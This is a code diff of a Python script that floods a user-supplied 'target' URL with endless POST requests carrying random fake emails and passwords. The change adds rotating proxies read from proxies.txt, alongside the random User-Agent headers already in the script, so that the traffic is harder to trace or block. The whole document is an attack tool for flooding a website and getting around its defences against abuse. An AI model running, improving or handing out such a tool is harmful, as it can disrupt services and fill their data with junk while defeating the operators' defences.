@@ -32,7 +32,15 @@ def generate_random_email():
 def generate_random_password():
     return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
 
+import random
+
 def send_posts(url):
+    with open("proxies.txt", "r") as f:
+        proxies = f.readlines()
+
+    # Remove newline characters from the end of each line
+    proxies = [p.strip() for p in proxies]
+
     while True:
         email = generate_random_email()
         password = generate_random_password()
@@ -40,8 +48,15 @@ def send_posts(url):
         ua = UserAgent()
         user_agent = ua.random
         headers = {'User-Agent': user_agent}
-        response = requests.post(url, data=data, headers=headers,)
-        print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}")
+
+        # Select a random proxy from the list
+        proxy = random.choice(proxies)
+
+        # Use the proxy for the request
+        response = requests.post(url, data=data, headers=headers, proxies={"http": f"http://{proxy}"})
+
+        print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}, Proxy: {proxy}")
+
 
 def main():
     url = input("Enter the URL of the target you want to flood: ")
